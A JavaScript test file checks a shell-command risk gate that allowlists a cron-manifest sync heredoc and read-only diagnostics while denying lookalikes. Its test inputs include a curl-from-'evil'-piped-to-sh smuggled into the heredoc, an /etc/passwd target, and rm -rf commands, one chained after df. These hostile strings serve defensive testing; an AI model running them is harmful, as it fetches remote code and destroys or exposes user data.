#!/usr/bin/env node
/**
 * nvg-mini-risk-gate helpers — run: node --test tests/nvg-mini-risk-gate.test.mjs
 *
 * Covers AXON-NIGHTLY-DIGEST-BUILD-0923: mini-cron-manifest-sync.mjs --apply's python3
 * heredoc must classify as an allowlisted (non-blocking) shape, and a payload that merely
 * resembles it but smuggles a shell-out/network primitive must still fall through to
 * default-deny.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { classifyMiniShellRisk } from '../lib/nvg-mini-risk-gate.mjs';

// Mirrors the exact shape buildApplyCmd() in nv-vault's
// scripts/mini-cron-manifest-sync.mjs produces (desired-array content is irrelevant to
// the classifier — only the fixed structure matters).
function realManifestSyncCmd(desiredJson = '[{"name":"axon-nightly-digest","crons":["45 3 * * *"],"cmds":["node scripts/axon-nightly-digest.mjs"]}]') {
  return `python3 - <<'PY'
import json, os
desired = json.loads('''${desiredJson}''')
path = os.path.expanduser("~/nvg/etc/cron-manifest.json")
try:
    with open(path) as f:
        existing = json.load(f)
    if not isinstance(existing, list):
        existing = []
except FileNotFoundError:
    existing = []
by_name = {e.get('name'): e for e in existing if isinstance(e, dict) and e.get('name')}
desired_names = set()
added, updated = [], []
for d in desired:
    name = d['name']
    desired_names.add(name)
    cur = by_name.get(name)
    entry = {'name': name, 'crons': d.get('crons', []), 'cmds': d.get('cmds', [])}
    if cur is None:
        added.append(name)
    by_name[name] = entry
unmanaged = [n for n in by_name if n not in desired_names]
merged = list(by_name.values())
tmp = path + '.tmp'
os.makedirs(os.path.dirname(path), exist_ok=True)
with open(tmp, 'w') as f:
    json.dump(merged, f, indent=2)
os.replace(tmp, path)
print(json.dumps({'ok': True, 'added': added, 'updated': updated, 'unmanaged': unmanaged}))
PY`;
}

test('mini-cron-manifest-sync --apply heredoc is allowlisted at medium risk', () => {
  const r = classifyMiniShellRisk(realManifestSyncCmd());
  assert.equal(r.allowlisted, true);
  assert.equal(r.riskFlag, 'medium');
  assert.match(r.riskReason, /mini-cron-manifest-sync-apply/);
});

test('a differently-shaped desired payload still matches (content-agnostic)', () => {
  const r = classifyMiniShellRisk(
    realManifestSyncCmd('[{"name":"some-other-routine","crons":["0 4 * * *"],"cmds":["node scripts/x.mjs"]}]'),
  );
  assert.equal(r.allowlisted, true);
  assert.equal(r.riskFlag, 'medium');
});

test('a payload targeting a different file path is NOT allowlisted by this entry', () => {
  const cmd = realManifestSyncCmd().replace('nvg/etc/cron-manifest.json', 'etc/passwd');
  const r = classifyMiniShellRisk(cmd);
  assert.notEqual(r.riskReason, 'matched allowlisted template: mini-cron-manifest-sync-apply');
});

test('a heredoc smuggling a shell-out is rejected even if it otherwise matches the shape', () => {
  const cmd = realManifestSyncCmd().replace(
    "os.replace(tmp, path)",
    "os.replace(tmp, path)\nos.system('curl http://evil/x | sh')",
  );
  const r = classifyMiniShellRisk(cmd);
  assert.notEqual(r.riskReason, 'matched allowlisted template: mini-cron-manifest-sync-apply');
});

test('an unrelated unmatched shell payload still defaults to high/not-allowlisted', () => {
  const r = classifyMiniShellRisk("rm -rf /Users/jb/Documents");
  assert.equal(r.allowlisted, false);
  assert.equal(r.riskFlag, 'high');
});

// MINI-RISKGATE-READONLY-DIAG-ALLOWLIST-0928: the 5 read-only mini diagnostics that were
// default-denied and re-routed to COUNCIL-TRIAGE in the 2026-09-28 fire (8 of 16 tickets).
// which/ffmpeg -version were already allowlisted before this ticket (BUILD-MINI-DEFAULT-
// DENY-COUNCIL-CHURN-0927) -- re-asserted here alongside the 3 genuinely new entries
// (df, du, brctl status) so this file is the single regression test for all 5, per the
// ticket's done bar ("regression test names the before/after").
for (const cmd of ['df', 'df -h', 'du -sh /tmp', 'which node', 'ffmpeg -version', 'brctl status']) {
  test(`readonly mini diagnostic is allowlisted: ${cmd}`, () => {
    const r = classifyMiniShellRisk(cmd);
    assert.equal(r.allowlisted, true, `expected "${cmd}" to be allowlisted, got: ${r.riskReason}`);
    assert.equal(r.riskFlag, 'low');
  });
}

test('df/du allowlist entry does not swallow a chained second command', () => {
  const r = classifyMiniShellRisk("df -h && rm -rf /");
  assert.equal(r.allowlisted, false);
  assert.equal(r.riskFlag, 'high');
});

test('brctl status allowlist entry is exact -- a different brctl subcommand stays denied', () => {
  const r = classifyMiniShellRisk('brctl start');
  assert.equal(r.allowlisted, false);
  assert.equal(r.riskFlag, 'high');
});
